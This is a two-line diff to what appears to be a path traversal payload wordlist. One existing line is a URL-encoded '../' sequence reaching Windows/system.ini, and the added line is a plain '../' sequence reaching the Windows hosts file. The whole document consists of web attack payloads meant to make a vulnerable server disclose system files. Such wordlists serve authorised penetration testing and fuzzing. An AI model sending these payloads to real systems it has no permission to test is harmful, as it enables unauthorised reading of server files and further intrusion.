@@ -1,2 +1,3 @@
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini
+../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts
 
